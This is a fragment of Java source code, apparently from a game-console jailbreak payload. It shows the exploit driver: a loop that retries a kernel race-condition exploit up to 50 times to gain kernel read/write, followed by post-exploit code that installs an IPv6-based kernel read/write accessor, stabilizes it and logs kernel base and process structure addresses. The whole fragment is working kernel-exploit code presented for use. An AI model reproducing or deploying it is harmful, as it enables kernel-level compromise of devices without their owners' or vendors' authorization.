                            KernelPointer ofilesAddress = KernelPointer.valueOf(offsets.processOpenFilesAddress.addr());
                            KernelPointer kbaseAddress = KernelPointer.valueOf(offsets.kernelAddressBase.addr());
                            KernelReadWrite.setAccessor(new KernelAccessorIPv6(ofilesAddress, kbaseAddress));
                            DebugStatus.info("[+] installed ipv6 based kernel r/w");

                            stabilize(offsets, lookupFd);

                            DebugStatus.info("[+] thread=" + offsets.threadAddress);
                            DebugStatus.info("[+] proc=" + offsets.processAddress);
                            DebugStatus.info("[+] ofiles=" + offsets.processOpenFilesAddress);
                            DebugStatus.info("[+] allproc=" + offsets.allProcAddress);
                            if (!KernelPointer.NULL.equals(offsets.kernelAddressBase)) {
                                DebugStatus.info("[+] kdata=" + offsets.kernelDataBase);
                                DebugStatus.info("[+] kbase=" + offsets.kernelAddressBase);
                            } else {
                                DebugStatus.info("[-] kbase cannot be determined due to unknown offsets on the current firmware version. Address of allproc is saved in system property: " + PayloadConstants.ALLPROC_ADDRESS_PROPERTY);
                                System.setProperty(PayloadConstants.ALLPROC_ADDRESS_PROPERTY, Long.toString(offsets.allProcAddress.addr()));
                            }
                        } else {
                            KernelReadWrite.removeAccessor(getClass().getClassLoader());
                        }
                    } catch (SdkException | RuntimeException | Error e) {
                        Status.printStackTrace("[-] unable to upgrade kernel accessor", e);
                        KernelReadWrite.removeAccessor(getClass().getClassLoader());
                    }
                } else {
                    DebugStatus.info("[-] failed to determine kernel addresses");
                    KernelReadWrite.removeAccessor(getClass().getClassLoader());
                }

                if (KernelReadWrite.getAccessor(getClass().getClassLoader()) == null) {
                    DebugStatus.info("[-] removing slow kernel accessor before exiting");
                }

                // Terminate kprim thread
                kPrimJobs[neo].signalExit();
                try {
                    kPrimThreads[neo].join();
                } catch (InterruptedException e) {
                    // Ignore
                }
            } finally {
                kaSlow.free();
            }
        } else {
            DebugStatus.error("[-] failed");
        }
    }

    @Override
    public void run() {
        final int MAX_ATTEMPTS = 50;

        int lookupFd = -1;
        int neo = -1;
        for (int i = 1; i <= MAX_ATTEMPTS; ++i) {
            DebugStatus.error("[+] exploit attempt " + i);
            try {
                prepare();
                RaceResult raceResult = race();
                RWResult rwResult = null;
                if (raceResult.returnCode == 0) {
                    rwResult = getRW(raceResult.lookupFd, raceResult.reclaimFd);
                }
                cleanup();

                if (rwResult != null && rwResult.returnCode != -1) {
                    DebugStatus.info("[+] slow kernel r/w obtained");
                    lookupFd = raceResult.lookupFd;
                    neo = rwResult.returnCode;
                    break;
                }
            } catch (RuntimeException | Error e) {
                Status.printStackTrace("[-] unexpected runtime error", e);
            }
        }

        postExploit(lookupFd, neo);

        mainLibKernel.closeLibrary();
        finished = true;
    }
}
